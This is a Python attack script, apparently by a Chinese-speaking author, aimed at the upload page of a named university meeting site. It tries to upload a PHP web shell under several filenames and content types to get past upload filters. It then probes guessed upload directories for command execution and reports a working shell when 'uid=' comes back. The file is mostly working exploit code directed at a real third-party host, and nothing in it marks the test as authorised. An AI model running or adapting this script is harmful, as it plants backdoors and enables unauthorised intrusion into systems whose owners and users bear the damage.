#!/usr/bin/env python3
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/enmeeting"

print("[*] 测试mobilemeeting.php上传功能...")

# 获取页面内容分析表单
resp = requests.get(f"{base_url}/mobilemeeting.php", verify=False, timeout=5)
content = resp.text

# 查找表单字段
form_fields = re.findall(r'name=["\']([^"\']+)["\']', content)
print(f"[*] 发现的表单字段: {form_fields}")

# 尝试多种上传方式
shell_content = "<?php system($_GET['c']); ?>"

# 方式1: 标准文件上传
files = {
    'file': ('shell.php', shell_content, 'application/x-php'),
    'upload': ('shell.php', shell_content, 'application/x-php'),
    'file_upload': ('shell.php', shell_content, 'application/x-php'),
}

# 方式2: 图片文件
files_img = {
    'file': ('shell.jpg', shell_content, 'image/jpeg'),
    'image': ('shell.jpg', shell_content, 'image/jpeg'),
}

# 方式3: 文本文件
files_txt = {
    'file': ('shell.txt', shell_content, 'text/plain'),
}

# 尝试所有方式
upload_tests = [
    (files, 'PHP文件'),
    (files_img, '图片文件'),
    (files_txt, '文本文件'),
]

for upload_files, desc in upload_tests:
    print(f"\n[*] 尝试{desc}上传...")
    data = {'submit': 'upload', 'upload': '1'}
    
    resp = requests.post(f"{base_url}/mobilemeeting.php", files=upload_files, data=data, verify=False, timeout=5)
    
    if 'success' in resp.text.lower() or 'uploaded' in resp.text.lower():
        print(f"[+] {desc}上传可能成功")
        # 检查上传位置
        locations = [
            '/enmeeting/shell.php',
            '/enmeeting/uploads/shell.php',
            '/enmeeting/upload/shell.php',
            '/enmeeting/files/shell.php',
            '/enmeeting/tmp/shell.php',
        ]
        
        for location in locations:
            test_resp = requests.get(f"https://olympic.su.ac.th{location}?c=id", verify=False, timeout=5)
            if 'uid=' in test_resp.text:
                print(f"[+] Shell获取成功: https://olympic.su.ac.th{location}?c=id")
                exit(0)
    
    # 检查响应中的文件路径
    if 'path' in resp.text.lower() or 'location' in resp.text.lower():
        print(f"[!] 响应可能包含文件路径: {resp.text[:500]}")

print("\n[+] 上传测试完成")
